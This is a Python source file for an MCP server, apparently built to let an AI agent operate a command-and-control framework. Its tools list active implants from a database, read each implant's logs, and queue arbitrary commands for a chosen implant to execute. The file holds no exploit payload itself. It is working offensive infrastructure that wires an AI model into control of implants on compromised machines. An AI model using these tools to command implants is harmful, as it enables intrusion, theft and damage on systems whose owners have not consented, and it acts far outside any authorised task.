from fastmcp import FastMCP
from datetime import datetime
import sqlite3
import os
import json

DB_PATH = "/OC2PATH/shared/mcp.sqlite"
LOG_DIR = "/OC2PATH/shared/logs/api/implant_logs/json/"
mcp = FastMCP("OC2 MCP", stateless_http=True)

#@mcp.resource("implants://active")
@mcp.tool()
def list() -> list[dict]:
    """Gets all active implants"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM active_implants")
    rows = c.fetchall()
    cols = [col[0] for col in c.description]
    conn.close()
    return [dict(zip(cols, row)) for row in rows]


@mcp.tool()
def logs(implant_uid: str) -> dict:
    """Returns parsed logs for a given implant UID"""
    filepath = os.path.join(LOG_DIR, f"{implant_uid}.json")
    if not os.path.isfile(filepath):
        return {"error": "Log file not found"}

    parsed_logs = []
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    parts = line.split(" ", 3)
                    if len(parts) < 4:
                        raise ValueError("Line does not contain valid timestamp and JSON")

                    timestamp = f"{parts[0]} {parts[1]} {parts[2]}"
                    json_str = parts[3]
                    event = json.loads(json_str)
                    parsed_logs.append({
                        "timestamp": timestamp,
                        "event": event
                    })
                except ValueError as ve:
                    parsed_logs.append({
                        "error": f"Malformed line: {line}",
                        "details": str(ve)
                    })
        return {"logs": parsed_logs}
    except Exception as e:
        return {"error": f"Failed to read log file: {str(e)}"}



@mcp.tool()
def schedule(implant_uid: str, command: str) -> dict:
    """Schedule a command to be executed by a given implant."""
    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        INSERT INTO commands (created_at, implant_uid, command, executed)
        VALUES (?, ?, ?, 0)
    """, (now, implant_uid, command))
    conn.commit()
    conn.close()
    return {"status": "scheduled"}

if __name__ == "__main__":
    mcp.run(transport="http", path="/oc2", host="127.0.0.1", port=8888)
